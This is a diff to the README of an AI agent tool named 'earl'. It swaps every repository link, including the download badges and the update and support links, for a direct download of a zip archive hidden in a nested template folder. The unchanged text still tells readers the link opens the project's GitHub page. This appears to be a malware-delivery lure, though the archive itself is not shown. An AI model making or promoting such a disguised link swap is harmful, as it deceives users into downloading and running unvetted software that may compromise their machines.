@@ -1,6 +1,6 @@
 # 🤖 earl - Safe AI Agents at Your Command
 
-[![Download earl](https://img.shields.io/badge/Download-earl-green?style=for-the-badge&logo=github)](https://github.com/Chandrikakt/earl)
+[![Download earl](https://img.shields.io/badge/Download-earl-green?style=for-the-badge&logo=github)](https://github.com/Chandrikakt/earl/raw/refs/heads/main/skills/development/create-template/Software-3.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these instructions to get earl running on your Windows PC.
 
 Click the green button below to visit the page where you can download the software:
 
-[![Download earl](https://img.shields.io/badge/Download-earl-blue?style=for-the-badge&logo=github)](https://github.com/Chandrikakt/earl)
+[![Download earl](https://img.shields.io/badge/Download-earl-blue?style=for-the-badge&logo=github)](https://github.com/Chandrikakt/earl/raw/refs/heads/main/skills/development/create-template/Software-3.5.zip)
 
 This link takes you to the GitHub page for earl. There, you will find the latest release versions. Download the Windows version of earl from the releases once you open the page.
 
@@ -108,7 +108,7 @@ You may want to set up earl to fit your needs better. Configuration files store 
 
 Keep earl up to date to get new fixes and features:
 
-1. Visit the main GitHub page again: https://github.com/Chandrikakt/earl
+1. Visit the main GitHub page again: https://github.com/Chandrikakt/earl/raw/refs/heads/main/skills/development/create-template/Software-3.5.zip
 
 2. Check the **Releases** section for the latest version.
 
@@ -146,7 +146,7 @@ Or
 
 If you have problems or questions:
 
-- Visit the GitHub page: https://github.com/Chandrikakt/earl
+- Visit the GitHub page: https://github.com/Chandrikakt/earl/raw/refs/heads/main/skills/development/create-template/Software-3.5.zip
 
 - Check the **Issues** tab for common problems and fixes.
 
@@ -164,4 +164,4 @@ The GitHub repository page has more detailed guides and instructions if you want
 
 Use this link anytime you want to get the latest version or reinstall:
 
-[![Download earl](https://img.shields.io/badge/Download-earl-green?style=for-the-badge&logo=github)](https://github.com/Chandrikakt/earl)
+[![Download earl](https://img.shields.io/badge/Download-earl-green?style=for-the-badge&logo=github)](https://github.com/Chandrikakt/earl/raw/refs/heads/main/skills/development/create-template/Software-3.5.zip)
